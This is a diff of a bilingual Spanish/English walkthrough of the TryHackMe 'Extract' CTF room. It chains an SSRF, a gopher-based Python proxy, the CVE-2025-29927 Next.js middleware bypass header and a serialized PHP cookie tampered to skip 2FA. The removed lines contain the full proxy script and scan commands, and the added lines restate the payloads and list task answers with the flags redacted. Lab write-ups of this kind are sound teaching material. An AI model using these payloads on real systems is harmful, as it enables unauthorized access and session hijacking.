@@ -2,126 +2,90 @@
 
 ### Información de la Sala / Room Information
 
-* **Dificultad / Difficulty:** HARD (premium challenge).
-* **Tipo / Type:** Web (SSRF, Next.js middleware bypass, cookie manipulation).
+* **Dificultad / Difficulty:** HARD
+* **Tipo / Type:** CTF
 * **Slug:** `extract`
 * **Link:** https://tryhackme.com/room/extract
-* **Fuente / Source:** [Jery0843/TryHackMe](https://github.com/Jery0843/TryHackMe)
-
----
+* **Sección / Section:** 03 Level Hard
+* **Fuente / Source:** Writeups públicos de Jery0843/TryHackMe, jaxafed, matty69v, Majid Banday (Medium), Wild Wild Wolf y 0xb0b.
 
 ## Solucionario de Tareas / Task Solutions
 
-### Reconocimiento Inicial / Initial Reconnaissance
+> **ES:** Extract es un challenge web que encadena varias vulnerabilidades: un SSRF en `/preview.php` (parámetro `url`) bloquea `file://` pero permite `http://` y `gopher://`; se descubre un servicio interno Next.js en el puerto 10000, protegido por middleware vulnerable a CVE-2025-29927 (header `x-middleware-subrequest`), que tras el bypass entrega Flag 1 y las credenciales `librarian:L[REDACTED]!`. El SSRF reconvertido en proxy con gopher también salta la restricción de IP de `/management`, y una cookie PHP serializada no firmada (`O:9:"AuthToken":1:{s:9:"validated";b:0;}`) se altera a `b:1;` para saltar el 2FA y obtener Flag 2.
+> **EN:** Extract is a web challenge chaining several vulnerabilities: an SSRF in `/preview.php` (`url` parameter) blocks `file://` but allows `http://` and `gopher://`; an internal Next.js service on port 10000 is discovered, protected by middleware vulnerable to CVE-2025-29927 (`x-middleware-subrequest` header), which after the bypass yields Flag 1 and the `librarian:L[REDACTED]!` credentials. The SSRF turned into a gopher proxy also bypasses the IP restriction of `/management`, and an unsigned serialized PHP cookie (`O:9:"AuthToken":1:{s:9:"validated";b:0;}`) is tampered to `b:1;` to skip 2FA and obtain Flag 2.
 
-```bash
-nmap -T4 -n -sC -sV -Pn -p- 10.10.212.133
+### Task 1 - Reconocimiento y SSRF en /preview.php / Reconnaissance and SSRF in /preview.php
+
+> **ES:** Nmap revela dos puertos: 22 (OpenSSH 9.6p1) y 80 (Apache 2.4.58). El sitio "TryBookMe - Online Library" carga una preview de PDFs mediante `/preview.php?url=...`. Probando contra un servidor propio se confirma el SSRF; los protocolos `file://` están bloqueados por keyword pero `http://` y `gopher://` funcionan.
+> **EN:** Nmap reveals two ports: 22 (OpenSSH 9.6p1) and 80 (Apache 2.4.58). The "TryBookMe - Online Library" site loads a PDF preview via `/preview.php?url=...`. Testing against an owned server confirms the SSRF; `file://` schemes are blocked by keyword but `http://` and `gopher://` work.
+
+| Pregunta / Question | Respuesta / Answer |
+|----------|--------|
+| (Tarea práctica / Practical task) | `No answer needed` |
+
+### Task 2 - Descubrimiento interno y proxy gopher / Internal Discovery and Gopher Proxy
+
+> **ES:** Fuzzeando `http://127.0.0.1:FUZZ/` a través del SSRF se encuentra un servicio interno en el puerto 10000: una aplicación Next.js con un endpoint `/customapi` que responde "Not Authorized". Se escribe un pequeño proxy en Python que escucha localmente, recibe la petición, la codifica dos veces en URL y la envía por `gopher://` al servicio interno vía `/preview.php`, devolviendo la respuesta.
+> **EN:** Fuzzing `http://127.0.0.1:FUZZ/` through the SSRF finds an internal service on port 10000: a Next.js application with a `/customapi` endpoint answering "Not Authorized". A small Python proxy is written: it listens locally, receives the request, double URL-encodes it and sends it via `gopher://` to the internal service through `/preview.php`, returning the response.
+
+| Pregunta / Question | Respuesta / Answer |
+|----------|--------|
+| (Tarea práctica / Practical task) | `No answer needed` |
+
+### Task 3 - Bypass de middleware Next.js (CVE-2025-29927) / Next.js Middleware Bypass (CVE-2025-29927)
+
+> **ES:** Se añade el header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` a la petición contra `/customapi`: la autenticación que vive en el middleware de Next.js se bypasea y la API devuelve la Flag 1 junto con las credenciales `librarian:L[REDACTED]!`.
+> **EN:** The `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` header is added to the request against `/customapi`: the authentication living in the Next.js middleware is bypassed and the API returns Flag 1 along with the `librarian:L[REDACTED]!` credentials.
+
+| Pregunta / Question | Respuesta / Answer |
+|----------|--------|
+| Flag 1 (Next.js /customapi) | `THM{...redacted...}` |
+
+### Task 4 - Bypass de 2FA con manipulación de cookies / 2FA Bypass via Cookie Manipulation
+
+> **ES:** Reconfigurando el proxy gopher para apuntar al puerto 80, `/management/` responde a la IP interna y muestra un login. Con `librarian:L[REDACTED]!` se inicia sesión y la app redirige a `/management/2fa.php`; la cookie `auth_token` contiene `O:9:"AuthToken":1:{s:9:"validated";b:0;}` (objeto PHP serializado, sin firma). Cambiando `b:0;` a `b:1;` el 2FA se considera validado y se obtiene la Flag 2.
+> **EN:** Reconfiguring the gopher proxy to target port 80, `/management/` answers from the internal IP and shows a login. Logging in with `librarian:L[REDACTED]!` redirects to `/management/2fa.php`; the `auth_token` cookie contains `O:9:"AuthToken":1:{s:9:"validated";b:0;}` (a serialized, unsigned PHP object). Changing `b:0;` to `b:1;` marks the 2FA as validated and Flag 2 is retrieved.
+
+| Pregunta / Question | Respuesta / Answer |
+|----------|--------|
+| Flag 2 (management / 2FA) | `THM{...redacted...}` |
+
+## Metodología / Methodology
+
+1. **Paso / Step - Reconocimiento:** `nmap -sC -sV -p-` muestra 22 (SSH) y 80 (Apache); el sitio solicita PDFs vía `/preview.php?url=...`, que se identifica como vector de SSRF.
+2. **Paso / Step - Confirmar el SSRF:** `/preview.php?url=http://<IP-propia>/` genera un hit en el servidor del atacante; `file://` es bloqueado pero `http://` y `gopher://` funcionan.
+3. **Paso / Step - Enumeración interna:** fuzzing de puertos en `127.0.0.1` vía SSRF descubre el puerto 10000 con una aplicación Next.js y su `/customapi`.
+4. **Paso / Step - Proxy gopher:** un script Python escucha en local, hace doble URL-encoding de la petición y la entrega por `gopher://` al servicio interno, permitiendo mandar headers y métodos arbitrarios.
+5. **Paso / Step - Bypass de autenticación:** el header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` explota CVE-2025-29927; `/customapi` devuelve Flag 1 y las credenciales `librarian:L[REDACTED]!`.
+6. **Paso / Step - Login interno:** apuntando el proxy gopher al puerto 80 se accede a `/management/` desde la IP interna, saltando la restricción de IP; el login con las credenciales obtenidas lleva a `/management/2fa.php`.
+7. **Paso / Step - Bypass de 2FA:** la cookie `auth_token` (objeto PHP serializado sin firma) se modifica de `validated;b:0;` a `validated;b:1;`; se elimina la capa de 2FA y `/management/2fa.php` entrega Flag 2, completando la sala.
+
+### Cadena de ataque / Attack Chain
+
+```
+nmap -> 22 (SSH) + 80 (Apache, TryBookMe)
+              |
+   GET /preview.php?url=<URL>   <- SSRF
+              |   (file:// bloqueado, gopher:// OK)
+              v
+   fuzzing 127.0.0.1 -> puerto 10000 (Next.js /customapi)
+              |
+   proxy local (socket) + gopher:// + doble URL-encode
+              |
+   x-middleware-subrequest header  ->  CVE-2025-29927
+              |
+   /customapi -> Flag 1  +  librarian:L[REDACTED]!
+              |
+   gopher://127.0.0.1:80 -> /management/ (bypass IP)
+              |
+   login librarian -> cookie auth_token (PHP serialized)
+              |
+   validated;b:0;  ->  validated;b:1;
+              |
+   /management/2fa.php -> Flag 2
 ```
 
-**Resultados:**
-- **Port 22 (SSH):** OpenSSH 9.6p1
-- **Port 80 (HTTP):** Apache 2.4.58
-
-Visitando `http://10.10.212.133/` se revela **TryBookMe - Online Library**. El punto clave aparece en el código fuente de la página: endpoint `/preview.php` con un parámetro **url**.
-
-### SSRF en /preview.php
-
-**Prueba básica:**
-
-```bash
-echo "test" > test.txt
-python3 -m http.server 80
-```
-
-Request:
-```plaintext
-http://10.10.212.133/preview.php?url=http://10.4.4.28/test.txt
-```
-
-El servidor descarga el contenido correctamente.
-
-**Protocolos testeados:**
-```text
-file://   → Bloqueado
-http://   → Funciona
-gopher:// → Funciona
-```
-
-### Descubrimiento de Servicio Interno
-
-Fuzzing de puertos internos vía SSRF:
-```bash
-ffuf -u 'http://10.10.212.133/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
-```
-
-**Descubrimiento:** El puerto **10000** está escuchando internamente. `http://127.0.0.1:10000/` revela una aplicación **Next.js**.
-
-### Proxy Gopher
-
-Script Python para usar el SSRF como proxy hacia el servicio interno:
-```python
-#!/usr/bin/env python3
-import socket, requests, urllib.parse, threading
-
-LHOST = '127.0.0.1'
-LPORT = 5000
-TARGET_HOST = "10.10.212.133"
-HOST_TO_PROXY = "127.0.0.1"
-PORT_TO_PROXY = 10000
-
-def handle_client(conn, addr):
-    with conn:
-        data = conn.recv(65536)
-        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
-        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
-        resp = requests.get(target_url)
-        conn.sendall(resp.content)
-
-def start_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((LHOST, LPORT))
-    server.listen(5)
-    print(f"[*] Listening on {LHOST}:{LPORT}")
-    while True:
-        client_socket, addr = server.accept()
-        client_handler = threading.Thread(target=handle_client, args=(client_socket, addr))
-        client_handler.start()
-
-if __name__ == "__main__":
-    start_server()
-```
-
-### Bypass de Autenticación en Next.js - CVE-2025-29927
-
-Inyección del header de bypass:
-```plaintext
-x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
-```
-
-Accediendo a `/customapi` se obtiene:
-- **Flag 1**
-- **Credenciales:** `librarian:L[REDACTED]!`
-
-### Manipulación de Cookies - Bypass de 2FA
-
-1. **Bypass de restricción IP:** usar el proxy SSRF apuntando al puerto 80 para acceder a `/management/`.
-2. Tras iniciar sesión, `/management/2fa.php` establece esta cookie:
-   ```
-   O:9:"AuthToken":1:{s:9:"validated";b:0;}
-   ```
-3. Cambiar `b:0;` → `b:1;`
-4. Esto bypasea el 2FA y revela **Flag 2**.
-
-### Resumen de la Cadena de Explotación
-
-- SSRF en `/preview.php`
-- Protocolo gopher para acceso interno
-- Bypass de middleware de Next.js (CVE-2025-29927)
-- Manipulación de cookies para bypass de 2FA
-
-**Flags Capturadas: 2/2**
-
----
+**Lección:** Un SSRF no es solo "desde dónde leer": con `gopher://` se convierte en un proxy TCP arbitrario capaz de lanzar peticiones HTTP crudas, explotar CVEs de infraestructura (Next.js middleware) y manipular sesiones no firmadas para esquivar segundas autenticaciones.
 
 ## ⚠️ Descargo de Responsabilidad (Disclaimer)
 
